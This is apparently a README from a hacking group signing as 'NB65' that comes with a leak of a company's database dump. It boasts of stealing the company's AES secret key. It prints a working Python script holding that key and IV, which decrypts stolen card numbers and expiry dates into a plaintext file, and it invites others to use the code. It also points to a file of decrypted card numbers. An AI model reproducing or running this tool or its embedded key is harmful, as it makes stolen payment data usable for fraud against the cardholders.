Greetz,

So here's the deal.  The original sql dump stored card numbers that they had converted to
encrypted strings wrapped in base64. That can be observed in chunk01.original.csv.

We wrote a tool to decrypt that weak ass encryption so that the data becomes meaningful
and usable. How?  We stole their fucking secret key.

#!/usr/bin/python
import base64
from Crypto.Cipher import AES
from pkcs7 import PKCS7Encoder

key = "8uisiWDkCU6LWKDq8XlezA=="
iv  = "Cq1uoLr9Y8fXFeNCegttkw=="

class AESCipher:
    def __init__(self):
        self.block_size = 16  
        self.key = base64.b64decode(key) 
        self.iv = base64.b64decode(iv)

    def _pkcs7decode(self, text):
        val = text[-1]
        if val > self.block_size:
            raise ValueError('Input is not padded or padding is corrupt')
        return (text[:len(text) - val]).decode('utf-8')

    def decrypt(self, text):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decode_text = base64.b64decode(text)
        pad_text = aes.decrypt(decode_text)
        return self._pkcs7decode(pad_text)


if __name__ == '__main__':
    cipher = AESCipher()
    with open('recent_cards.csv', 'r') as f:
        with open('decrypted_cards.txt', 'a') as k:
            for line in f.readlines():
                try:
                    res = line.split(',')
                    card_number = cipher.decrypt(res[0])
                    exp_month = cipher.decrypt(res[1])
                    exp_year = cipher.decrypt(res[2])
                    #cvv = cipher.decrypt(res[4])
                    cvv = ''
                    k.write('%s | %s/%s | %s\n' % (card_number, exp_month, exp_year, cvv))
                except Exception as e:
                    print(e)
                    pass

Feel free to use the code if you want.

The decrypted card numbers are in the fuck.you.txt file. 

<3 NB65

